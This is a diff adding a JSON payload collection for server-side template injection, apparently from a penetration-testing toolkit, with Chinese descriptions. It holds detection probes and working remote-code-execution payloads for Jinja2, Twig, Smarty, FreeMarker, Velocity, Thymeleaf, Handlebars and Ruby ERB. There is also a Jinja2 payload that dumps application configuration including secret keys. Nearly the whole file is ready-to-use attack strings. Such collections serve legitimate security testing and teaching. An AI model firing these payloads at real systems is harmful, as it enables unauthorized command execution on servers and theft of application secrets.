@@ -1,0 +1,162 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "SSTI 模板注入",
+  "categories": ["探测与识别", "Python 系", "PHP 系", "Java 系", "Node 与 Ruby"],
+  "items": [
+    {
+      "id": "ssti-detect-math",
+      "title": "通用数学探测",
+      "category": "探测与识别",
+      "code": "{{7*7}}",
+      "desc": "多个模板引擎都支持该表达式，若回显 49 则可能存在 SSTI。",
+      "tags": ["ssti", "detect", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
+    },
+    {
+      "id": "ssti-detect-multi",
+      "title": "多引擎组合探测",
+      "category": "探测与识别",
+      "code": "${7*7}{{7*7}}<%= 7*7 %>#{7*7}",
+      "desc": "一次提交多种语法，根据哪部分被求值判断具体模板引擎。",
+      "tags": ["ssti", "detect", "fingerprint"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
+    },
+    {
+      "id": "ssti-jinja-config",
+      "title": "Jinja2 读取配置",
+      "category": "Python 系",
+      "code": "{{config.items()}}",
+      "desc": "Flask/Jinja2 下读取应用配置，可能暴露 SECRET_KEY 等敏感信息。",
+      "tags": ["ssti", "jinja2", "flask"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
+    },
+    {
+      "id": "ssti-jinja-rce",
+      "title": "Jinja2 命令执行",
+      "category": "Python 系",
+      "code": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+      "desc": "通过内置对象定位 os 模块执行命令，适用于 Jinja2 沙箱未严格限制的场景。",
+      "tags": ["ssti", "jinja2", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
+    },
+    {
+      "id": "ssti-jinja-lipsum",
+      "title": "Jinja2 lipsum 利用",
+      "category": "Python 系",
+      "code": "{{ lipsum.__globals__['os'].popen('id').read() }}",
+      "desc": "利用 lipsum 全局函数访问 os 模块，常见于过滤了 cycler 的场景。",
+      "tags": ["ssti", "jinja2", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 SSTI 研究"
+    },
+    {
+      "id": "ssti-tornado",
+      "title": "Tornado 表达式",
+      "category": "Python 系",
+      "code": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+      "desc": "通过 Python 对象继承链枚举子类，寻找可利用的模块。",
+      "tags": ["ssti", "python", "tornado"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 SSTI 研究"
+    },
+    {
+      "id": "ssti-twig-rce",
+      "title": "Twig 命令执行",
+      "category": "PHP 系",
+      "code": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+      "desc": "Twig 1.x 下注册回调执行命令，Twig 2+ 已修复该利用方式。",
+      "tags": ["ssti", "twig", "php", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Twig SSTI 研究"
+    },
+    {
+      "id": "ssti-twig-modern",
+      "title": "Twig 现代版本利用",
+      "category": "PHP 系",
+      "code": "{{['id']|filter('system')}}",
+      "desc": "Twig 2/3 可通过 filter 调用任意函数，具体函数白名单需按版本判断。",
+      "tags": ["ssti", "twig", "php", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Twig SSTI 研究"
+    },
+    {
+      "id": "ssti-smarty",
+      "title": "Smarty 命令执行",
+      "category": "PHP 系",
+      "code": "{php}echo `id`;{/php}",
+      "desc": "Smarty 老版本支持 {php} 标签，可直接执行 PHP 代码。",
+      "tags": ["ssti", "smarty", "php"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Smarty SSTI 研究"
+    },
+    {
+      "id": "ssti-freemarker",
+      "title": "FreeMarker 执行",
+      "category": "Java 系",
+      "code": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "desc": "FreeMarker 内置 Execute 工具类可直接执行系统命令。",
+      "tags": ["ssti", "freemarker", "java", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 FreeMarker SSTI 研究"
+    },
+    {
+      "id": "ssti-velocity",
+      "title": "Velocity 执行",
+      "category": "Java 系",
+      "code": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('id'))#set($br=$p.getInputStream())",
+      "desc": "通过反射获取 Runtime 执行命令，适用于 Velocity 模板注入。",
+      "tags": ["ssti", "velocity", "java", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Velocity SSTI 研究"
+    },
+    {
+      "id": "ssti-thymeleaf",
+      "title": "Thymeleaf 预处理",
+      "category": "Java 系",
+      "code": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
+      "desc": "Thymeleaf 预处理表达式可绕过常规限制执行 SpEL，需要特定返回路径配合。",
+      "tags": ["ssti", "thymeleaf", "java", "spring"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Thymeleaf SSTI 研究"
+    },
+    {
+      "id": "ssti-handlebars",
+      "title": "Handlebars 探测",
+      "category": "Node 与 Ruby",
+      "code": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+      "desc": "Handlebars 原型链利用链，版本差异较大，仅作研究参考。",
+      "tags": ["ssti", "handlebars", "node", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Handlebars SSTI 研究"
+    },
+    {
+      "id": "ssti-erb",
+      "title": "Ruby ERB 执行",
+      "category": "Node 与 Ruby",
+      "code": "<%= system('id') %>",
+      "desc": "ERB 模板直接执行 Ruby 代码，若用户输入进入模板则危害极高。",
+      "tags": ["ssti", "ruby", "erb", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
+    }
+  ]
+}
